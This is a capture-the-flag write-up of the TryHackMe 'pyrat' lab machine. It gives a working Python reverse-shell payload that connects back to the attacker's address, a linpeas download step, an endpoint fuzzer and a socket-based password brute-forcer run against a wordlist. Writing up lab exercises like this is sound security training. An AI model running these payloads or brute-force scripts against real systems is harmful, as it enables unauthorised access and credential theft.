# TRYHACKME: pyrat Write-Up

**Difficulty:** Easy  
**Category:** Web Exploitation

---

This is my walkthrough of the *pyrat* machine from TryHackMe.

## Scenario

Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.

### Enumeration

I started with an nmap scan:

```bash
nmap -sC -sV -p- 10.10.10.75

8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
|_http-favicon: Unknown favicon MD5: FBD3DB4BEF1D598ED90E26610F23A63F
|_http-open-proxy: Proxy might be redirecting requests
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop:
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions:
|     invalid syntax (<string>, line 1)
|   GetRequest:
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest:
|     name 'OPTIONS' is not defined
|   Help:
|_    name 'HELP' is not defined
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
|_http-title: Site doesnt have a title (text/html; charset=utf-8).
```

## Post Enum

### Post-enum

**A. Python RCE on port 8000**

Netcat to the service:

```bash
nc 10.10.207.60 8000
```

Create a local listener:

```bash
nc -lvnp 4444
```

Reverse shell payload used (example):

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.4.13.17", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty
pty.spawn("/bin/bash")
```

**Got a reverse shell back.**

## Privilege escalation

On our local machine we go to the `linpeas` directory, and start a python HTTP server:

```bash
python -m http.server 8000
```

On the compromised server I go to `/tmp/` and download from the IP of my VPN (provided by TryHackMe):

After download is complete we run `linpeas` and find a `.git` directory at `/opt/dev/`:

![git found](/images/git-found.jpg)

After further investigation, a config file in `.git` provides us with credentials so we can finally SSH:

![credentials found](/images/credss.jpg)

### SSH!!!

![user flag](/images/user_flag.jpg)

### git log

![git log](/images/git_log.jpg)

This code explained: when `shell` is typed on our connection the `pyrat.py` app gives us a shell, and if some endpoint is given then it proceeds to `get_this_endpoint(client_socket)`, which performs some operations. So in order to exploit this we write Python code to fuzz endpoint names.

Example fuzzer:

```python
import socket

url = '10.10.210.118'
endpoints = ['some_endpoint', 'shell', 'assets', 'api', 'admin', 'backup', 'user', 'id', 'login', 'help', 'root', 'register']

def fuzzer(ip, port, endPt):
    for endPoint in endPt:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip, port))

            print(f"on endpoint: {endPoint}")
            client_socket.sendall(endPoint.encode() + b'\n')

            response = client_socket.recv(1024)
            print(f"responded with: {response.decode()}")

            client_socket.close()
        except Exception as e:
            print(f"{e}")


fuzzer(url, 8000, endpoints)
```

Results looked like:

- on endpoint: some_endpoint  
  responded with: `name 'some_endpoint' is not defined`

- on endpoint: shell  
  responded with: `$ `

- on endpoint: assets  
  responded with: `name 'assets' is not defined`

- on endpoint: api  
  responded with: `name 'api' is not defined`

- on endpoint: admin  
  responded with: `Password:`

- on endpoint: backup  
  responded with: `name 'backup' is not defined`

- on endpoint: user  
  responded with: `name 'user' is not defined`

- on endpoint: id  
  responded with: *(no output shown)*

- on endpoint: login  
  responded with: `name 'login' is not defined`

- on endpoint: help  
  responded with: *(no output shown)*

- on endpoint: root  
  responded with: `name 'root' is not defined`

- on endpoint: register  
  responded with: `name 'register' is not defined`

### Admin exploit

When admin data is sent to server on the netcat connection we get a password prompt three times, and the connection to the admin endpoint closes, so we write yet another exploit in order to fuzz passwords. It goes like this:

```python
import socket

target_ip = input("Enter IP for tcp_socket connection: ")
target_port = 8000
password_wordlist = "/home/user-leab/Documents/penT/words/rockyou_4000.txt"
username = "admin"

def fuzz_passwords_socket():
    """
    Brute-forces a custom TCP service efficiently over a single connection.
    """
    try:
        print(f"[*] Connecting to {target_ip}:{target_port}...")
        # Use a 'with' statement for automatic socket closing
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((target_ip, target_port))
            
            # --- Perform initial handshake once ---
            # Send the username
            client_socket.sendall(username.encode() + b"\n")
            
            # Wait for the "Password:" prompt
            response = client_socket.recv(1024).decode()
            if "Password:" not in response:
                print(f"[!] Server did not ask for a password. Response: {response}")
                return

            print("[*] Username accepted. Starting password fuzzing...")

            # --- Loop through passwords on the persistent connection ---
            with open(password_wordlist, "r", encoding="latin-1") as file:
                passwd_list = file.readlines()
                for passw in passwd_list:
                    password = passw.strip()
                   
                    client_socket.sendall(password.encode() + b"\n")  # Send the password
                    
                    # Receive the server's response to the password
                    response = client_socket.recv(1024).decode()
                    
                    # Check for a success indicator
                    if "success" in response.lower() or "admin" in response.lower():
                        print(f"\n[+] SUCCESS! Password found: {password}")
                        return password
                    else:
                        print(f"\ntried:  {password}, and got {response}")

    except socket.error as e:
        print(f"[!] Socket Error: {e}")
    except FileNotFoundError:
        print(f"[!] Error: Wordlist not found at '{password_wordlist}'")
    except Exception as e:
        print(f"[!] An unexpected error occurred: {e}")

    print("\n[-] Fuzzing complete. Password not found in the wordlist.")
    return None

if __name__ == "__main__":
    fuzz_passwords_socket()
```

After a grueling fuzzing session we find that `abc123` was the password.

And finally:

![root flag](/images/root_flag.jpg)

